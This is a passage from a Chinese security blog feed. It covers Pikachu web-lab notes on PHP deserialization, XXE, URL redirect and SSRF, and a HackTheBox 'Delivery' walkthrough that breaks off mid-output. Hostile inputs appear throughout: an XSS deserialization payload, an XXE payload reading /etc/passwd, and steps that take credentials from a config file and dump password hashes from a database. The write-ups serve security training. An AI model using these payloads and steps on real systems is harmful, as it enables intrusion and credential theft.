$u=unserialize(&quot;O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:7:&quot;pikachu&quot;;&#125;&quot;);</span><br><span class="line">    echo $u-&gt;test; //得到的结果为pikachu</span><br><span class="line">    </span><br><span class="line">序列化和反序列化本身没有问题,但是如果反序列化的内容是用户可以控制的,且后台不正当的使用了PHP中的魔法函数,就会导致安全问题</span><br><span class="line"></span><br><span class="line">        常见的几个魔法函数:</span><br><span class="line">        __construct()当一个对象创建时被调用</span><br><span class="line"></span><br><span class="line">        __destruct()当一个对象销毁时被调用</span><br><span class="line"></span><br><span class="line">        __toString()当一个对象被当作一个字符串使用</span><br><span class="line"></span><br><span class="line">        __sleep() 在对象在被序列化之前运行</span><br><span class="line"></span><br><span class="line">        __wakeup将在序列化之后立即被调用</span><br><span class="line"></span><br><span class="line">        漏洞举例:</span><br><span class="line"></span><br><span class="line">        class S&#123;</span><br><span class="line">            var $test = &quot;pikachu&quot;;</span><br><span class="line">            function __destruct()&#123;</span><br><span class="line">                echo $this-&gt;test;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        $s = $_GET[&#x27;test&#x27;];</span><br><span class="line">        @$unser = unserialize($a);</span><br><span class="line"></span><br><span class="line">        payload:O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure><h2 id="0x13-XXE"><a href="#0x13-XXE" class="headerlink" title="0x13.XXE"></a>0x13.XXE</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">XXE -&quot;xml external entity injection&quot;</span><br><span class="line">既&quot;xml外部实体注入漏洞&quot;。</span><br><span class="line">概括一下就是</span><br><span class="line">&quot;攻击者通过向服务器注入指定的xml实体内容,从而让服务器按照指定的配置进行执行,导致问题&quot;</span><br><span class="line">也就是说服务端接收和解析了来自用户端的xml数据,</span><br><span class="line">而又没有做严格的安全控制,从而导致xml外部实体注入。</span><br><span class="line"></span><br><span class="line">具体的关于xml实体的介绍,网络上有很多,自己动手先查一下。</span><br><span class="line">现在很多语言里面对应的解析xml的函数默认是禁止解析外部实体内容的,从而也就直接避免了这个漏洞。</span><br><span class="line">以PHP为例,在PHP里面解析xml用的是libxml,其在≥2.9.0的版本中,默认是禁止解析xml外部实体内容的。</span><br><span class="line"></span><br><span class="line">本章提供的案例中,为了模拟漏洞,通过手动指定LIBXML_NOENT选项开启了xml外部实体解析。</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;  encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE name [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br></pre></td></tr></table></figure><img src="/2021/04/28/Pikachu/image-20210428085543239.png" class><h2 id="0x14-URL重定向"><a href="#0x14-URL重定向" class="headerlink" title="0x14.URL重定向"></a>0x14.URL重定向</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">不安全的url跳转</span><br><span class="line"></span><br><span class="line">不安全的url跳转问题可能发生在一切执行了url地址跳转的地方。</span><br><span class="line">如果后端采用了前端传进来的(可能是用户传参,或者之前预埋在前端页面的url地址)参数作为了跳转的目的地,而又没有做判断的话</span><br><span class="line">就可能发生&quot;跳错对象&quot;的问题。</span><br><span class="line"></span><br><span class="line">url跳转比较直接的危害是:</span><br><span class="line"><span class="meta">--&gt;</span><span class="bash">钓鱼,既攻击者使用漏洞方的域名(比如一个比较出名的公司域名往往会让用户放心的点击)做掩盖,而最终跳转的确实钓鱼网站</span></span><br></pre></td></tr></table></figure><h2 id="0x15-SSRF"><a href="#0x15-SSRF" class="headerlink" title="0x15.SSRF"></a>0x15.SSRF</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">SSRF(Server-Side Request Forgery:服务器端请求伪造)</span><br><span class="line">其形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能,但又没有对目标地址做严格过滤与限制</span><br><span class="line"></span><br><span class="line">导致攻击者可以传入任意的地址来让后端服务器对其发起请求,并返回对该目标地址请求的数据</span><br><span class="line"></span><br><span class="line">数据流:攻击者-----&gt;服务器----&gt;目标地址</span><br><span class="line"></span><br><span class="line">根据后台使用的函数的不同,对应的影响和利用方法又有不一样</span><br><span class="line">PHP中下面函数的使用不当会导致SSRF:</span><br><span class="line">file_get_contents()</span><br><span class="line">fsockopen()</span><br><span class="line">curl_exec()</span><br><span class="line">            </span><br><span class="line">如果一定要通过后台服务器远程去对用户指定(&quot;或者预埋在前端的请求&quot;)的地址进行资源请求,则请做好目标地址的过滤。</span><br></pre></td></tr></table></figure><h3 id="01-SSRF-curl"><a href="#01-SSRF-curl" class="headerlink" title="01.SSRF(curl)"></a>01.SSRF(curl)</h3><p><code>可以测开放的端口</code></p><img src="/2021/04/28/Pikachu/image-20210428091315523.png" class><h3 id="02-SSRF-file-get-content"><a href="#02-SSRF-file-get-content" class="headerlink" title="02.SSRF(file_get_content)"></a>02.SSRF(file_get_content)</h3><img src="/2021/04/28/Pikachu/image-20210428141007433.png" class>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x01-暴力破解&quot;&gt;&lt;a href=&quot;#0x01-暴力破解&quot; class=&quot;headerlink&quot; title=&quot;0x01.暴力破解&quot;&gt;&lt;/a&gt;0x01.暴力破解&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Burte Force（暴力破解）概述&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;“暴力破解”是一攻击手段，在web攻击中，一般会使用这种手段对应用系统的认证信息进行获取。 &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;其过程就是使用大量的认证信息在认证接口进行尝试登录，直到得到正确的结果。 &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;为了提高效率，暴力破解一般会使用带有字典的工具来进行自动化操作。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;理论上来说，大多数系统都是可以被暴力破解的，只要攻击者有足够强大的计算能力和时间，所以断定一个系统是否存在暴力破解漏洞，其条件也不是绝对的。 &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;我们说一个web应用系统存在暴力破解漏洞，一般是指该web应用系统没有采用或者采用了比较弱的认证安全策略，导致其被暴力破解的“可能性”变的比较高。 &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;这里的认证安全策略, 包括：&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;1.是否要求用户设置复杂的密码；&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2.是否每次认证都使用安全的验证码（想想你买火车票时输的验证码～）或者手机otp；&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3.是否对尝试登录的行为进行判断和限制（如：连续5次错误登录，进行账号锁定或IP地址锁定等）；&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4.是否采用了双因素认证；&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="Web靶场" scheme="https://lunamoore.github.io/categories/Web%E9%9D%B6%E5%9C%BA/"/>
    
    
    <category term="靶机" scheme="https://lunamoore.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>HTB-[delivery]</title>
    <link href="https://lunamoore.github.io/2021/02/04/HTB-delivery/"/>
    <id>https://lunamoore.github.io/2021/02/04/HTB-delivery/</id>
    <published>2021-02-04T03:12:17.000Z</published>
    <updated>2021-02-04T03:18:20.850Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-简述"><a href="#0x00-简述" class="headerlink" title="0x00.简述"></a>0x00.简述</h2><img src="/2021/02/04/HTB-delivery/image-20210203224703300.png" class><a id="more"></a><h2 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01.信息收集"></a>0x01.信息收集</h2><p><code>只开放了22与80端口</code></p><blockquote><p>添加两条hosts文件</p><p>10.10.10.222    helpdesk.delivery.htb<br>10.10.10.222    delivery.htb</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/delivery# nmap -sC -sV -sT 10.10.10.222 -oN nmap.CVT</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-03 16:27 EST</span><br><span class="line">Nmap scan report for helpdesk.delivery.htb (10.10.10.222)</span><br><span class="line">Host is up (0.34s latency).</span><br><span class="line">Not shown: 965 closed ports, 33 filtered ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 (RSA)</span><br><span class="line">|   256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 (ECDSA)</span><br><span class="line">|_  256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.14.2</span><br><span class="line">|_http-server-header: nginx/1.14.2</span><br><span class="line">|_http-title: delivery</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 100.17 seconds</span><br><span class="line">root@JIYE:~/htb/delivery#</span><br></pre></td></tr></table></figure><h2 id="0x02-访问80端口"><a href="#0x02-访问80端口" class="headerlink" title="0x02.访问80端口"></a>0x02.访问80端口</h2><p><code>发现于邮件相关</code></p><img src="/2021/02/04/HTB-delivery/image-20210203225046353.png" class><p><code>手动爬虫发现两个有用链接如下</code></p><blockquote><p>第一个为一个计票系统</p></blockquote><img src="/2021/02/04/HTB-delivery/image-20210203225320648.png" class><blockquote><p>第二个为提供MatterMost服务</p></blockquote><img src="/2021/02/04/HTB-delivery/image-20210203225437119.png" class><blockquote><p>点击MatterMost server跳转到如下页面，可以登入注册</p></blockquote><img src="/2021/02/04/HTB-delivery/image-20210203225641859.png" class><h2 id="0x03-提交表单进行测试"><a href="#0x03-提交表单进行测试" class="headerlink" title="0x03.提交表单进行测试"></a>0x03.提交表单进行测试</h2><p><code>提交</code></p><img src="/2021/02/04/HTB-delivery/image-20210203225931140.png" class><p><code>得到ticket id 6285564与邮箱6285564@delivery.htb</code></p><img src="/2021/02/04/HTB-delivery/image-20210203230847316.png" class><p><code>提交完成之后可以进行状态查询</code></p><img src="/2021/02/04/HTB-delivery/image-20210203231322565.png" class><p><code>可以看到状态如下</code></p><img src="/2021/02/04/HTB-delivery/image-20210203231357635.png" class><h2 id="0x04-邮箱利用MasterMost"><a href="#0x04-邮箱利用MasterMost" class="headerlink" title="0x04.邮箱利用MasterMost"></a>0x04.邮箱利用MasterMost</h2><p><code>使用6285564@delivery.htb注册MasterMost</code></p><img src="/2021/02/04/HTB-delivery/image-20210203231611322.png" class><p><code>再次查看状态，可以看到刚刚的邮件激活连接</code></p><img src="/2021/02/04/HTB-delivery/image-20210203231908206.png" class><h2 id="0x05-激活登入"><a href="#0x05-激活登入" class="headerlink" title="0x05.激活登入"></a>0x05.激活登入</h2><p><code>点击如下连接</code></p><blockquote><p><span class="exturl" data-url="aHR0cDovL2RlbGl2ZXJ5Lmh0Yjo4MDY1L2RvX3ZlcmlmeV9lbWFpbD90b2tlbj1qb3JwMWtrZnJxaGtneDl3b3FhM3o5ZGszM2h3aHhyaGhvem9uMXNzdW10dGplcHA2bW1iOHE5OWF5aXQ4aWRxJmFtcDtlbWFpbD02Mjg1NTY0QGRlbGl2ZXJ5Lmh0Yg==">http://delivery.htb:8065/do_verify_email?token=jorp1kkfrqhkgx9woqa3z9dk33hwhxrhhozon1ssumttjepp6mmb8q99ayit8idq&amp;email=6285564%40delivery.htb<i class="fa fa-external-link-alt"></i></span></p></blockquote><img src="/2021/02/04/HTB-delivery/image-20210203232040991.png" class><p><code>加入团队</code></p><img src="/2021/02/04/HTB-delivery/image-20210203232228472.png" class><p><code>得到用户名与密码</code></p><blockquote><p>maildeliverer:Youve_G0t_Mail! </p></blockquote><img src="/2021/02/04/HTB-delivery/image-20210203232549365.png" class><p><code>登入得到flag</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~# ssh maildeliverer@10.10.10.222</span><br><span class="line">The authenticity of host &#x27;10.10.10.222 (10.10.10.222)&#x27; can&#x27;t be established.</span><br><span class="line">ECDSA key fingerprint is SHA256:LKngIDlEjP2k8M7IAUkAoFgY/MbVVbMqvrFA6CUrHoM.</span><br><span class="line">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="line">Warning: Permanently added &#x27;10.10.10.222&#x27; (ECDSA) to the list of known hosts.</span><br><span class="line">maildeliverer@10.10.10.222&#x27;s password: </span><br><span class="line">Linux Delivery 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64</span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Wed Feb  3 10:27:44 2021 from 10.10.14.55</span><br><span class="line">maildeliverer@Delivery:~$ ls</span><br><span class="line">user.txt</span><br><span class="line">maildeliverer@Delivery:~$ cat user.txt </span><br><span class="line">******************************</span><br><span class="line">maildeliverer@Delivery:~$</span><br></pre></td></tr></table></figure><h2 id="0x06-提权"><a href="#0x06-提权" class="headerlink" title="0x06.提权"></a>0x06.提权</h2><p><code>这里查看root说的两句话</code></p><blockquote><p>第一个可能存在与PleaseSubscribe!类似的密码</p></blockquote><img src="/2021/02/04/HTB-delivery/image-20210203234447237.png" class><blockquote><p>第二个可以使用hashcat，进行类型密码的枚举。</p><p>提示了这么多，可以开搞了。</p></blockquote><img src="/2021/02/04/HTB-delivery/image-20210203234610886.png" class><p><code>查看mattermost的配置文件</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">maildeliverer@Delivery:/tmp$ find / -name mattermost &gt; list</span><br><span class="line">maildeliverer@Delivery:/tmp$ cat list </span><br><span class="line">/opt/mattermost</span><br><span class="line">/opt/mattermost/bin/mattermost</span><br><span class="line">/var/lib/mysql/mattermost</span><br></pre></td></tr></table></figure><p><code>最终找到配置文件位置</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">maildeliverer@Delivery:/opt/mattermost/config$ ls</span><br><span class="line">cloud_defaults.json  config.json  README.md</span><br></pre></td></tr></table></figure><p><code>找到数据库的配置文件如下</code></p><blockquote><p>数据库为mysql</p><p>用户名与密码为mmuser:Crack_The_MM_Admin_PW</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&quot;SqlSettings&quot;: &#123;</span><br><span class="line">        &quot;DriverName&quot;: &quot;mysql&quot;,</span><br><span class="line">        &quot;DataSource&quot;: &quot;mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s&quot;,</span><br><span class="line">        &quot;DataSourceReplicas&quot;: [],</span><br><span class="line">        &quot;DataSourceSearchReplicas&quot;: [],</span><br><span class="line">        &quot;MaxIdleConns&quot;: 20,</span><br><span class="line">        &quot;ConnMaxLifetimeMilliseconds&quot;: 3600000,</span><br><span class="line">        &quot;MaxOpenConns&quot;: 300,</span><br><span class="line">        &quot;Trace&quot;: false,</span><br><span class="line">        &quot;AtRestEncryptKey&quot;: &quot;n5uax3d4f919obtsp1pw1k5xetq1enez&quot;,</span><br><span class="line">        &quot;QueryTimeout&quot;: 30,</span><br><span class="line">        &quot;DisableDatabaseSearch&quot;: false</span><br><span class="line">    &#125;,</span><br></pre></td></tr></table></figure><p><code>登入数据库，查询数据</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line">maildeliverer@Delivery:~$ mysql -ummuser -pCrack_The_MM_Admin_PW</span><br><span class="line">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span><br><span class="line">Your MariaDB connection id is 3173</span><br><span class="line">Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span><br><span class="line"></span><br><span class="line">Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; show databses;</span><br><span class="line">ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;databses&#x27; at line 1</span><br><span class="line">MariaDB [(none)]&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| mattermost         |</span><br><span class="line">+--------------------+</span><br><span class="line">2 rows in set (0.000 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; use mattermost</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">MariaDB [mattermost]&gt; show tables;</span><br><span class="line">+------------------------+</span><br><span class="line">| Tables_in_mattermost   |</span><br><span class="line">+------------------------+</span><br><span class="line">| Audits                 |</span><br><span class="line">| Bots                   |</span><br><span class="line">| ChannelMemberHistory   |</span><br><span class="line">| ChannelMembers         |</span><br><span class="line">| Channels               |</span><br><span class="line">| ClusterDiscovery       |</span><br><span class="line">| CommandWebhooks        |</span><br><span class="line">| Commands               |</span><br><span class="line">| Compliances            |</span><br><span class="line">| Emoji                  |</span><br><span class="line">| FileInfo               |</span><br><span class="line">| GroupChannels          |</span><br><span class="line">| GroupMembers           |</span><br><span class="line">| GroupTeams             |</span><br><span class="line">| IncomingWebhooks       |</span><br><span class="line">| Jobs                   |</span><br><span class="line">| Licenses               |</span><br><span class="line">| LinkMetadata           |</span><br><span class="line">| OAuthAccessData        |</span><br><span class="line">| OAuthApps              |</span><br><span class="line">| OAuthAuthData          |</span><br><span class="line">| OutgoingWebhooks       |</span><br><span class="line">| PluginKeyValueStore    |</span><br><span class="line">| Posts                  |</span><br><span class="line">| Preferences            |</span><br><span class="line">| ProductNoticeViewState |</span><br><span class="line">| PublicChannels         |</span><br><span class="line">| Reactions              |</span><br><span class="line">| Roles                  |</span><br><span class="line">| Schemes                |</span><br><span class="line">| Sessions               |</span><br><span class="line">| SidebarCategories      |</span><br><span class="line">| SidebarChannels        |</span><br><span class="line">| Status                 |</span><br><span class="line">| Systems                |</span><br><span class="line">| TeamMembers            |</span><br><span class="line">| Teams                  |</span><br><span class="line">| TermsOfService         |</span><br><span class="line">| ThreadMemberships      |</span><br><span class="line">| Threads                |</span><br><span class="line">| Tokens                 |</span><br><span class="line">| UploadSessions         |</span><br><span class="line">| UserAccessTokens       |</span><br><span class="line">| UserGroups             |</span><br><span class="line">| UserTermsOfService     |</span><br><span class="line">| Users                  |</span><br><span class="line">+------------------------+</span><br><span class="line">46 rows in set (0.000 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [mattermost]&gt; desc Users;</span><br><span class="line">+--------------------+--------------+------+-----+---------+-------+</span><br><span class="line">| Field              | Type         | Null | Key | Default | Extra |</span><br><span class="line">+--------------------+--------------+------+-----+---------+-------+</span><br><span class="line">| Id                 | varchar(26)  | NO   | PRI | NULL    |       |</span><br><span class="line">| CreateAt           | bigint(20)   | YES  | MUL | NULL    |       |</span><br><span class="line">| UpdateAt           | bigint(20)   | YES  | MUL | NULL    |       |</span><br><span class="line">| DeleteAt           | bigint(20)   | YES  | MUL | NULL    |       |</span><br><span class="line">| Username           | varchar(64)  | YES  | UNI | NULL    |       |</span><br><span class="line">| Password           | varchar(128) | YES  |     | NULL    |       |</span><br><span class="line">| AuthData           | varchar(128) | YES  | UNI | NULL    |       |</span><br><span class="line">| AuthService        | varchar(32)  | YES  |     | NULL    |       |</span><br><span class="line">| Email              | varchar(128) | YES  | UNI | NULL    |       |</span><br><span class="line">| EmailVerified      | tinyint(1)   | YES  |     | NULL    |       |</span><br><span class="line">| Nickname           | varchar(64)  | YES  |     | NULL    |       |</span><br><span class="line">| FirstName          | varchar(64)  | YES  |     | NULL    |       |</span><br><span class="line">| LastName           | varchar(64)  | YES  |     | NULL    |       |</span><br><span class="line">| Position           | varchar(128) | YES  |     | NULL    |       |</span><br><span class="line">| Roles              | text         | YES  |     | NULL    |       |</span><br><span class="line">| AllowMarketing     | tinyint(1)   | YES  |     | NULL    |       |</span><br><span class="line">| Props              | text         | YES  |     | NULL    |       |</span><br><span class="line">| NotifyProps        | text         | YES  |     | NULL    |       |</span><br><span class="line">| LastPasswordUpdate | bigint(20)   | YES  |     | NULL    |       |</span><br><span class="line">| LastPictureUpdate  | bigint(20)   | YES  |     | NULL    |       |</span><br><span class="line">| FailedAttempts     | int(11)      | YES  |     | NULL    |       |</span><br><span class="line">| Locale             | varchar(5)   | YES  |     | NULL    |       |</span><br><span class="line">| Timezone           | text         | YES  |     | NULL    |       |</span><br><span class="line">| MfaActive          | tinyint(1)   | YES  |     | NULL    |       |</span><br><span class="line">| MfaSecret          | varchar(128) | YES  |     | NULL    |       |</span><br><span class="line">+--------------------+--------------+------+-----+---------+-------+</span><br><span class="line">25 rows in set (0.001 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [mattermost]&gt; select Username,Password from Users;</span><br><span class="line">+----------------------------------+--------------------------------------------------------------+</span><br><span class="line">| Username                         | Password                                                     |</span><br><span class="line">+----------------------------------+--------------------------------------------------------------+</span><br><span class="line">| maninblack                       | $2a$10$EZnqACQzX8r.zHknpNnkj./4k4mWuBjfSphErBWULxjsXfUWmAwpC |</span><br><span class="line">| julius                           | $2a$10$he/ux5bbTQD9LHn.vdENBOFxZHViVBtu7y2Op4p81WjE8xfx.lgh6 |</span><br><span class="line">| demoo                            | $2a$10$mL83nl2BtSHwKw.whyR.ie.MA2URC4IM3N52rqAtvpwKTfIBSmQrK |</span><br><span class="line">| surveybot                        |                                                              |</span><br><span class="line">| test123                          | $2a$10$45ov3fMA1FUZJBxh1qlqSuy0TZlnBJ5tcx2HCIZI3eULPltoPrgQq |</span><br><span class="line">| c3ecacacc7b94f909d04dbfd308a9b93 | $2a$10$u5815SIBe2Fq1FZlv9S8I.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK |</span><br><span class="line">| 5b785171bfb34762a933e127630c4860 | 